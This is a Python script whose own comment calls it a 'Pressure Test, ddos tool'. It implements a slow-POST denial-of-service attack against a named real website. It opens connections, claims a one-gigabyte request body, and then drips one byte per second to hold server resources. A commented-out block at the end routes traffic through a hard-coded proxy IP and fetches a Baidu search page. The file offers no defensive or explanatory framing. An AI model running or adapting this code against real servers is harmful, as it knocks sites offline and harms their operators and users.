#!/usr/bin/env python3
# @author : csl
# @date   : 2018/09/04 16:29
import socket
import time
import threading

#Pressure Test,ddos tool
#---------------------------
MAX_CONN=1
PORT=8000
HOST="www.tuozhen.com"
PAGE="/"
#---------------------------

buf=("POST %s HTTP/1.1\r\n"
"Host: %s\r\n"
"Content-Length: 1000000000\r\n"
"Cookie: dklkt_dos_test\r\n"
"\r\n" % (PAGE,HOST))
socks=[]

def conn_thread():
    global socks
    for i in range(0,MAX_CONN):
        s=socket.socket (socket.AF_INET,socket.SOCK_STREAM)
        try:
            s.connect((HOST,PORT))
            s.send(buf)
            print ("[+] Send buf OK!,conn=%d\n"%i)
            socks.append(s)
        except Exception as ex:
            print ("[-] Could not connect to server or send error:%s"%ex)
            time.sleep(2)

def send_thread():
    global socks
    while True:
        for s in socks:
            try:
                s.send("f")
                print ("[+] send OK! %s"%s)
            except Exception as ex:
                print ("[-] send Exception:%s\n"%ex)
                socks.remove(s)
                s.close()
        time.sleep(1)

conn_th=threading.Thread(target=conn_thread,args=())
send_th=threading.Thread(target=send_thread,args=())
conn_th.start()
send_th.start()



# import socket
# import socks  # pip install PySocks
# socks.set_default_proxy(socks.HTTP,addr='176.122.175.163',port=443) #设置socks代理
# socket.socket = socks.socksocket  # 把代理应用到socket
# def blocking(wd):
#     sock = socket.socket()
#     sock.connect(('www.baidu.com',80)) # 连接百度
#     request = 'GET {} HTTP/1.0\r\nHost:www.baidu.com\r\n\r\n'.format('/s?wd={}'.format(wd)) # 构造http请求头
#     response = b''  # 用于接收数据
#     sock.send(request.encode())  # 发送http请求
#     chunk = sock.recv(1024)  # 一次接收1024字节数据
#     while chunk:  # 循环接收数据，若没有数据了说明已接收完
#         response += chunk  # 字符串拼接
#         chunk = sock.recv(1024)
#     print(response.decode())

# if __name__ == '__main__':
#     blocking('python')